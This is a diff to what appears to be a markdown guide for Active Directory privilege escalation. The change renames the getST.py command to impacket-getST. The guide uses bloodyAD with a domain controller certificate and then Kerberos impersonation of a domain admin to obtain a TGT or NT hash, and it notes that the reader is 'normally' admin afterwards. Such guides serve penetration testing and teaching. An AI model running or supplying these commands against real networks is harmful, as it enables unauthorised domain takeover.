@@ -36,7 +36,7 @@ python3 bloodyAD.py -d domain.local  -c ":DC.pem" -u 'COMPUTER_NAME$' --host DC_
 ```
 Then, try to impersonate a domain admin using impacket :
 ```bash
-getST.py -spn LDAP/DC.DOMAIN.LOCAL -impersonate ADMIN_NAME -dc-ip DC_IP 'domain.local/COMPUTER_NAME$:COMPUTER_PASSWORD'
+impacket-getST -spn LDAP/DC.DOMAIN.LOCAL -impersonate ADMIN_NAME -dc-ip DC_IP 'domain.local/COMPUTER_NAME$:COMPUTER_PASSWORD'
 ```
 HERE - You'll get either the .ccache file (TGT) or the NT Hash. If you get the NT Hash, you know what to do next ;). It's linked to the DC computer account, so normally, you're admin. To use .ccache file :
 ```bash
